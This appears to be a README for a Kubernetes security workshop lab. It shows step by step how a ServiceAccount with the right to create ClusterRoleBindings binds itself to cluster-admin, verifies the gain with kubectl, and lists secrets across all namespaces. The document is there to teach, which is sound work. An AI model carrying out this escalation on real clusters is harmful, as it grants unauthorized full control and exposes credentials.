# Cluster-Admin Binding

An attacker who has gained enough RBAC permissions inside a Kubernetes cluster can escalate privileges by creating a ClusterRoleBinding that ties any ServiceAccount or user to the built-in `cluster-admin` role, granting full control over every resource in the cluster.

## Description

Role-based access control (RBAC) is a key security feature in Kubernetes. RBAC can restrict the allowed actions of the various identities in the cluster. `cluster-admin` is a built-in high-privileged role in Kubernetes. Attackers who have permissions to create bindings and cluster-bindings in the cluster can create a binding to the `cluster-admin` ClusterRole or to other high-privilege roles, effectively granting themselves or a compromised account unrestricted access to the entire cluster.

## Prerequisites

- A running Kubernetes cluster (e.g., `workshop-cluster` via Kind).
- `kubectl` installed and configured to connect to your cluster.

## Quick Start

### 1. Create a low-privilege ServiceAccount

Deploy a ServiceAccount with no special permissions and verify it cannot list secrets.

```bash
kubectl apply -f serviceaccount.yaml
```

Confirm the account exists:

```bash
kubectl get serviceaccount attacker-sa -n default
```

### 2. Verify the ServiceAccount has no cluster-wide permissions

Impersonate the ServiceAccount and check what it can do:

```bash
kubectl auth can-i list secrets --as=system:serviceaccount:default:attacker-sa -n kube-system
```

Expected output:

```
no
```

```bash
kubectl auth can-i get nodes --as=system:serviceaccount:default:attacker-sa
```

Expected output:

```
Warning: resource 'nodes' is not namespace scoped
no
```

### 3. Escalate privileges by creating a ClusterRoleBinding

An attacker with `create clusterrolebindings` permission binds the ServiceAccount to `cluster-admin`:

```bash
kubectl apply -f cluster-admin-binding.yaml
```

### 4. Verify the escalated permissions

Check the same operations again after the binding is created:

```bash
kubectl auth can-i list secrets --as=system:serviceaccount:default:attacker-sa -n kube-system
```

Expected output:

```
yes
```

```bash
kubectl auth can-i get nodes --as=system:serviceaccount:default:attacker-sa
```

Expected output:

```
Warning: resource 'nodes' is not namespace scoped
yes
```

```bash
kubectl auth can-i '*' '*' --as=system:serviceaccount:default:attacker-sa
```

Expected output:

```
yes
```

The `attacker-sa` ServiceAccount now has unrestricted access to every resource in the cluster.

### 5. Demonstrate abuse — list secrets across all namespaces

```bash
kubectl get secrets --all-namespaces --as=system:serviceaccount:default:attacker-sa
```

This returns secrets from every namespace, including `kube-system`, exposing service account tokens and other sensitive material.

## Cleanup

```bash
kubectl delete -f cluster-admin-binding.yaml
kubectl delete -f serviceaccount.yaml
```

Verify the binding is gone:

```bash
kubectl get clusterrolebinding attacker-cluster-admin-binding 2>&1
```

Expected output:

```
Error from server (NotFound): clusterrolebindings.rbac.authorization.k8s.io "attacker-cluster-admin-binding" not found
```

## Resources

- [Kubernetes RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [Using RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#kubectl-auth-can-i)
- [Privilege Escalation via RBAC](https://www.microsoft.com/en-us/security/blog/2020/04/02/attack-matrix-kubernetes/)
